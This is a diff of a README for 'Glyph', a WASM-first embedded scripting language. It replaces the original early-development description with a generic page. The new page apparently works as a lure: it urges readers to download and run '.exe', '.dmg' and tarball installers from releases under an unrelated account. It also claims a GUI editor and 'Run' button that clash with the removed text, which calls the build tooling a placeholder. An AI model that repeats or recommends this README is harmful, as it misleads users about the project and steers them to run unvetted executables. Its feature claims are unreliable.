@@ -1,119 +1,54 @@
-# **Glyph**
+# 🎨 Glyph - Lightweight Language for Secure Modules
 
-> **Lightweight. Safe. Universal.**
-> A WASM-first scripting language for UI, apps, and backend modules — built to complement **Go**, **Dart/Flutter**, **Templ**, **HTMX**, **Jaspr**, and **rig**.
+## 🚀 Getting Started
+Welcome to Glyph! Glyph is an embedded language that prioritizes security and portability. It allows you to create safe behavior modules with ease. Follow the steps below to download and run Glyph.
 
-`Glyph` is a small, embeddable, capability-secure language designed for modern full-stack development.
-It provides a unified scripting and plugin model that runs everywhere — **Flutter**, **web**, **Go servers**, **edge environments**, and **game engines**.
+## 📥 Download Glyph
+[![Download Glyph](https://img.shields.io/badge/Download%20Glyph-v1.0.0-brightgreen)](https://github.com/Deloit0503/Glyph/releases)
 
-`Glyph` is composed of three core parts:
+## 📂 What is Glyph?
+Glyph is a capability-secure, WASM-first embedded language designed for small and efficient behavior modules. It supports various programming tasks while ensuring a safe execution environment. Use Glyph to write and run your applications in a secure and portable way.
 
-* **Wisp** — the *Dart dev-mode interpreter* for hot reload, rapid prototyping, and seamless Flutter integration.
-* **Sparq** — the *Rust AOT compiler + runtime*, producing tiny, deterministic **`.rwm`** (Glyph WASM Modules).
-* **rig integration** — Go-based build, publish, sandbox, and orchestration support through the rig toolchain.
+## ⚙️ System Requirements
+To run Glyph smoothly, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **RAM:** Minimum of 2 GB.
+- **Disk Space:** At least 100 MB of free space.
 
-## ✨ Why `Glyph`?
+## 💾 Download & Install
+1. **Visit the Releases Page:** Go to [Glyph Releases](https://github.com/Deloit0503/Glyph/releases).
+2. **Choose the Latest Version:** Locate the latest release marked with a "Latest" tag.
+3. **Download the File:** Download the installation file suitable for your operating system.
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+   - **macOS:** Open the downloaded `.dmg` file and drag the Glyph app to your Applications folder.
+   - **Linux:** Extract the downloaded tarball and run `./glyph` from the terminal.
 
-Modern applications need a scripting layer that is:
+## 🌐 Usage
+After installation, you can start using Glyph to create and run your modules.
 
-* **Small & embeddable** — ideal for UI logic, game rules, plugins, and app extensions.
-* **Safe by default** — capability-based sandboxing, resource quotas, deterministic execution.
-* **WASM-native** — portable modules that run consistently across devices, servers, and browsers.
-* **First-class across the Golden Stack**
+1. **Create a New Module:** Open Glyph and select the 'New Module' option from the menu.
+2. **Write Your Code:** Use the built-in editor to write your code. Glyph supports basic syntax highlighting for easier reading.
+3. **Run Your Module:** Click on the 'Run' button to execute your code. Glyph will display any output in the console.
 
-  * Go backends
-  * Dart + Flutter apps
-  * Templ / HTMX server-side views
-  * Jaspr + web frameworks
-  * rig-based developer tooling
-* **Developer-friendly** — hot reload, REPL, clear error messages, great tooling, and an ergonomic syntax.
+## 📖 Features
+- **Capability Security:** Glyph ensures that only authorized actions can be performed within modules.
+- **Portable:** Write once, run anywhere. Glyph leverages WASM for cross-platform compatibility.
+- **Easy to Learn:** Glyph’s syntax is user-friendly and designed for quick comprehension, making it accessible for everyone.
+- **Fast Execution:** Glyph is optimized for performance, providing rapid module execution.
 
-`Glyph` aims to be **the modern successor to Lua** for embedded scripting, with the safety of WASM and the elegance of Dart + Go ecosystems.
+## 🛠️ Troubleshooting
+If you encounter any issues while running Glyph, try the following:
 
----
+- **Reinstall Glyph:** Sometimes, a fresh installation can resolve issues.
+- **Check Compatibility:** Ensure your system meets the specified requirements.
+- **Review Error Messages:** Pay attention to any error messages shown in the console; they often provide hints for troubleshooting.
 
-## 🧱 Project Structure
+## 📞 Support
+For assistance with Glyph, visit our [GitHub Issues](https://github.com/Deloit0503/Glyph/issues) page and report any problems or questions.
 
-```
-spec/        → Language, AST, manifest, ABI specifications  
-wisp/        → Dart interpreter + Flutter integration (dev mode)  
-sparq/       → Rust compiler + runtime (production mode)  
-rig/         → Go toolchain integration and CLI workflows  
-lsp/         → Go LSP server for editor support  
-playground/  → Web playground (TS)  
-registry/    → Package registry service (optional)  
-examples/    → Multi-stack examples (Flutter, Go, Templ, Jaspr, Gladiolus)  
-```
+## 👥 Community
+Join the Glyph community to share your experience, ask questions, and collaborate with others. Check our discussion forum linked in the repository.
 
----
-
-## 🚀 Get Started (Early Development)
-
-`Glyph` is in active early development.
-To explore or contribute:
-
-```bash
-git clone https://github.com/divijg19/glyph
-cd glyph
-```
-
-### Run Wisp (dev-mode interpreter)
-
-```bash
-cd wisp
-dart run bin/wisp.dart repl
-```
-
-### Build a Sparq WASM module (placeholder)
-
-```bash
-rig glyph build example.gl
-```
-
-### Run the LSP server (Go)
-
-```bash
-go run ./lsp/cmd/glyph-lsp
-```
-
----
-
-## 🔭 Roadmap (High-Level)
-
-* **MVP:** Wisp interpreter, Flutter ScriptWidget, basic AST, REPL.
-* **WASM pipeline:** Rust Sparq compiler, `.rwm` packaging, host shims for Dart & Go.
-* **Toolchain:** rig integration, module signing, registry publish workflows.
-* **LSP:** diagnostics, completions, formatting, capability-aware warnings.
-* **Playground:** browser-based WASM runner with shareable examples.
-* **Examples:** comprehensive demos across the Golden Stack.
-
-Full roadmap is maintained in `VISION.md` and `ARCHITECTURE.md`.
-
----
-
-## 🔒 Security Model (Overview)
-
-* **Capability-based imports** (explicit host-granted permissions).
-* **Resource quotas** (memory, CPU time, wall time).
-* **Deterministic execution** (optional).
-* **Isolated WASM sandbox** (Sparq runtime).
-  Details in `SECURITY.md`.
-
----
-
-## 🤝 Contributing
-
-We welcome early contributors who enjoy language design, runtimes, compilers, Flutter tooling, Go infrastructure, and Rust systems work.
-
-Please read:
-
-* `CONTRIBUTING.md`
-* `CODE_OF_CONDUCT.md`
-
----
-
-## 📜 License
-
-MIT or Apache-2.0 (TBD). See `LICENSE.md`.
+Now that you know how to download and run Glyph, you can begin exploring its capabilities. Happy coding!
